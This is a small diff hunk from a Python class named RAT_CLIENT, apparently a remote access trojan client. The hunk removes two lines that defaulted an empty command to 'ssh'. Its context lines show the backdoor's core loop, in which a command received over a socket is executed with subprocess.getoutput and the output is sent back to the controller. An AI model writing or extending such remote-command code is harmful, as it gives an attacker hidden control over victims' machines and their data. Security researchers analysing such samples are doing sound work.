@@ -77,8 +77,6 @@ class RAT_CLIENT:
                     print (command)
                     if command.lower() == 'exit' :
                         a=0;
-                    if command == '':
-                        command = 'ssh'
                     output = subprocess.getoutput(command)
                     s.send(output.encode())
                     if not output:
